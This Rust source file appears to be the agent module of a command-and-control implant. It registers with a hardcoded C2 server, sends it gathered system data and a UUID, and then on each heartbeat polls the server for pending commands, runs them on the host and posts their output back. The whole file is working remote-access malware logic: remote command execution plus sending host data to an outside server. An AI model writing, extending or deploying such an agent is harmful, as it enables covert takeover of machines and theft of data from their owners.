use super::data::CheckPendingCommandHTTPResponse;
use crate::system::{
    commands::{execute_command, ExecutedCommand},
    gather,
};
use once_cell::sync::Lazy;
use reqwest;
use uuid::Uuid;
use std::error::Error;
use std::sync::Mutex;
#[cfg(debug_assertions)]
macro_rules! debug_log {
    ($($arg:tt)*) => (println!($($arg)*));
}

#[cfg(not(debug_assertions))]
macro_rules! debug_log {
    ($($arg:tt)*) => {};
}

/* Define C2 HTTP API SERVER */
const C2_SERVER: &str = "http://192.168.1.32:9090";

/* UUID logic */
static UUID: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
pub fn set_uuid(new_uuid: Uuid) {
    let mut uuid = UUID.lock().unwrap();
    *uuid = new_uuid.to_string();
}

pub fn get_uuid() -> String {
    let uuid = UUID.lock().unwrap();
    uuid.clone()
}

pub fn is_registered() -> bool {
    let uuid = UUID.lock().unwrap();
    !uuid.is_empty()
}
/*****************************************************************************************/
/* Heartbeet                                                                             */
/*****************************************************************************************/
#[derive(serde::Serialize)]
pub struct HeartbeetHTTPData {
    pub uuid: String,
    pub command: String,
    pub stdout: String,
    pub stderr: String,
    pub result: String,
}
pub fn heartbeet() -> Result<(), Box<dyn Error>> {

    // Check for pending commands to be executed and execute if any
    let http_client = reqwest::blocking::Client::new();
    let response = http_client.get(
        format!("{}/cpc?u={}", C2_SERVER, get_uuid())
    ).send()?;

    let mut executed_command = ExecutedCommand {
        command:    "None"      .to_string(),
        stdout:     ""          .to_string(),
        stderr:     ""          .to_string(),
        result:     "ERR_FETCH" .to_string(),
    };

    if response.status().is_success() {
        if let Ok(commands) = response.json::<CheckPendingCommandHTTPResponse>() {
            executed_command.result = "NO_EXEC".to_string();
            if let Some(command) = commands.pending_commands.first() {
                executed_command = execute_command(command);
            }
        }
    }

    // Send heartbeet
    let heartbeet_data = HeartbeetHTTPData { 
        uuid: get_uuid(),
        command: executed_command.command,
        stdout: executed_command.stdout,
        stderr: executed_command.stderr,
        result: executed_command.result
    };
    let heartbeet_data_json = serde_json::to_string(&heartbeet_data)?;
    let _ = http_client
        .post(format!("{}/hb?u={}", C2_SERVER, get_uuid()))
        .header("Content-Type", "application/json")
        .body(heartbeet_data_json)
        .send();

    debug_log!("Heartbeet sent");
    Ok(())
}

// Register agent
pub fn register() -> Result<(), Box<dyn Error>> {
    // Gather system data
    let sysdata = gather::system_data();
    let sysdata_json = serde_json::to_string(&sysdata)?;

    // Update to C2 Server
    let http_client = reqwest::blocking::Client::new();
    let _ = http_client
        .post(format!("{}/register", C2_SERVER))
        .header("Content-Type", "application/json")
        .body(sysdata_json)
        .send()?;
    set_uuid(sysdata.uuid);
    Ok(())
}


